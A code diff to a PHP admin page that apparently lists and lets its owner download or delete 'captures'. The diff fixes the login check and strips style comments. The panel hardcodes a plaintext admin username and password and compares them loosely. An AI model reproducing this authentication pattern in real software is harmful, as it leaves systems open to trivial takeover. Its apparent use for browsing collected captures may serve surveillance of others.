@@ -1,11 +1,17 @@
 <?php
 session_start();
+
 $admin_user = 'rootx';
 $admin_pass = 'rootx123';
+$error = '';
 
-if ($_POST['login']) {
+if (isset($_POST['login'])) {
     if ($_POST['username'] == $admin_user && $_POST['password'] == $admin_pass) {
         $_SESSION['loggedin'] = true;
+        header('Location: admin.php');
+        exit;
+    } else {
+        $error = "❌ Invalid credentials!";
     }
 }
 
@@ -97,8 +103,8 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
                 <input type="password" name="password" placeholder="Password" required>
                 <button type="submit" name="login">🔐 Login</button>
             </form>
-            <?php if (isset($_POST['login']) && !$_SESSION['loggedin']): ?>
-                <div class="error">❌ Invalid credentials!</div>
+            <?php if ($error): ?>
+                <div class="error"><?= $error ?></div>
             <?php endif; ?>
             <div class="footer">🔒 Secure Admin Access</div>
         </div>
@@ -166,7 +172,6 @@ foreach ($captures as $c) {
         }
         .container { max-width: 1400px; margin: 0 auto; }
         
-        /* Header */
         .header {
             background: linear-gradient(135deg, #1a0033, #33001a, #1a0033);
             padding: 30px;
@@ -200,7 +205,6 @@ foreach ($captures as $c) {
         .header .stats span { color: #ff0066; font-weight: bold; font-size: 18px; }
         .header .stats .label { color: #888; font-size: 13px; }
 
-        /* Filters */
         .filters {
             display: flex;
             gap: 12px;
@@ -234,14 +238,12 @@ foreach ($captures as $c) {
         .btn-clear { background: #e74c3c; color: #fff; }
         .btn-logout { background: #555; color: #fff; }
 
-        /* Grid */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 20px;
         }
 
-        /* Card */
         .card {
             background: rgba(255,255,255,0.03);
             border-radius: 14px;
@@ -330,7 +332,6 @@ foreach ($captures as $c) {
         .btn-download { background: #00b894; color: #fff; }
         .btn-delete { background: #e74c3c; color: #fff; }
 
-        /* Empty */
         .empty {
             text-align: center;
             padding: 80px 20px;
@@ -341,13 +342,11 @@ foreach ($captures as $c) {
         .empty .icon { font-size: 70px; margin-bottom: 15px; display: block; }
         .empty .sub { color: #555; font-size: 14px; }
 
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #0a0a1a; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         ::-webkit-scrollbar-thumb:hover { background: #555; }
 
-        /* Responsive */
         @media (max-width: 600px) {
             .header { flex-direction: column; text-align: center; gap: 15px; }
             .grid { grid-template-columns: 1fr; }
@@ -450,7 +449,6 @@ foreach ($captures as $c) {
             });
         }
 
-        // Auto refresh every 10 seconds
         setTimeout(() => location.reload(), 10000);
     </script>
 </body>
